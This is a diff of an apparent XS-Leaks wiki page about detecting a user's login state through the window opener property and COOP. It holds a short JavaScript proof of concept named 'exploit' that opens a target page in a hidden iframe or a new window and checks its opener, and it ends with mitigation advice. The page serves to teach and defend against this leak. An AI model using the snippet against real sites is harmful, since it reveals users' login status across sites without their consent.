@@ -18,39 +18,41 @@ weight = 2
 +++
 
 
-If a page sets its opener property to `null` or is using [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) depending on users' login status, it becomes possible to detect user's current status. For example, attackers can detect whether a user is logged in by opening an endpoint in an iframe (or a new window) which only authenticated users have access to, simply checking its window reference.
+If a page sets its opener property to `null` or is using [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) protection depending on users' state, it becomes possible to infer cross-site information about that state. For example, attackers can detect whether a user is logged in by opening an endpoint in an iframe (or a new window) which only authenticated users have access to, simply checking its window reference. 
 
 ## Code Snippet
-The below snippet demonstrates the attack where the target page is supposedly only accessible to authenticated users and is setting its `opener` property to null (or is using COOP with value other than `unsafe-none`):
+The below snippet demonstrates how to detect whether `opener` property was set to `null`, or whether the [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) header is present with the value other than `unsafe-none`. This is can be done with both iframes and new windows.
 
 ```javascript
-// define vulnerable URL
-const url = 'https://example.org/profile';
+// define the vulnerable URL
+const v_url = 'https://example.org/profile';
 
-const exploit = url => {
-  // let's use iframe to make the attack a little more stealthier and to avoid browsers' pop-up blockers
-  document.body.insertAdjacentHTML('beforeend', '<iframe name="xsleaks" style="height:700px;width:100%;display:none">');  // insert an invisible iframe
-  
-  // open the url in iframe and save the reference as win
-  const win = open(url, 'xsleaks');
+const exploit = (url, new_window) => {
+  let win;
+  if(new_window){
+    // open the url in a new tab to see if win.opener was affected by COOP
+    // or set to null
+    win = open(url);
+  }else{
+    // create an iframe to detect whether the opener is defined
+    // won't work for COOP detection, or if a page has implemented framing protections
+    document.body.insertAdjacentHTML('beforeend', '<iframe name="xsleaks">'); 
+    // redirect the iframe to the vulnerable URL
+    win = open(url, "xsleaks");
+  }
   
   // wait 2 seconds to let the page load
   setTimeout(() => {
     // check the opener property of the newly opened window
-    if(!win.opener) console.log('User\'s logged in- reference not defined');
+    if(!win.opener) console.log("win.opener is null");
+    else console.log("win.opener is defined");
   }, 2000);
 }
-exploit(url);
-```
-In case the page is not framable (or uses SameSite cookies), we can instead open the page in a new tab (`target="_blank"`) and achieve the same.
-{{< hint tip >}}
-The POC only works when `opener` is set to `null` either via JavaScript or using rel="noopener" (or alternative). Pages using COOP requires opening in a new window as they don't work in nested browsing context.
-{{< /hint >}}
+exploit(v_url);
+exploit(v_url, 1);
 
-{{< hint tip >}}
-Using a third parameter of `noopener` in [window.open](https://developer.mozilla.org/en-US/docs/Web/API/Window/open#Window_features) also sets `opener` to `null` which is exactly like setting `rel="noopener"` in anchor links.
-{{< /hint >}}
+```
 
 ## Defense
 
-The mitigation of this XS-Leak is to be consistent everywhere- set it to the same value in all pages using COOP. Using JavaScript to set `opener` to `null` may have edge cases because it's possible to disable JavaScript entirely using iframe's sandbox attribute.
+The mitigation of this XS-Leak is to be consistent across diferent pages; set it to the same value in all pages using COOP. Using JavaScript to set `opener` to `null` may have edge cases because it's possible to disable JavaScript entirely using iframe's sandbox attribute.
